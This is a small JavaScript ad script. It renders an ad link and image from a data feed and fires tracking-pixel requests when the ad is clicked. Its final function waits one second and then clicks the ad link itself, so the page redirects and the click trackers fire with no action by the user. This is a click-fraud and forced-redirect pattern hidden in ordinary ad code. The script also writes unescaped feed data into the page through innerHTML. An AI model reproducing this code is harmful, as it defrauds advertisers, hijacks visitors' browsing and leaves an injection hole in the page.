/*!2017-05-17 10:40 */
function send(a) {
    var b = new Image;
    window[Math.random().toString(16).substring(2)] = b,
        b.src = a
}
function opendsp_click() {
    if ("[object Array]" === Object.prototype.toString.call(rds))
        for (var a = 0; a < rds.length; a++)
            send(rds[a]);
    else
        send(rds)
}

var html = ""
    , reg = null
    , str = ""
    , data = null
    , rds = null;

function a(dt) {

    html = "<a id='a_' target='_self' href='{{click}}' onclick='opendsp_click()'><img src='{{img}}' border=0 /></a>";
    reg = /{{(\w*?)}}/gi;
         str = "";
         data = dt.items[0];
         rds = data.rd;

    str += html.replace(reg, function (a, b) {
        return data[b].toString() || ""
    });
    var _div = document.createElement('div');
    _div.innerHTML = str ;
    document.body.appendChild(_div);

    window.setTimeout(function () {
        document.getElementById("a_").click();
    },1000)

}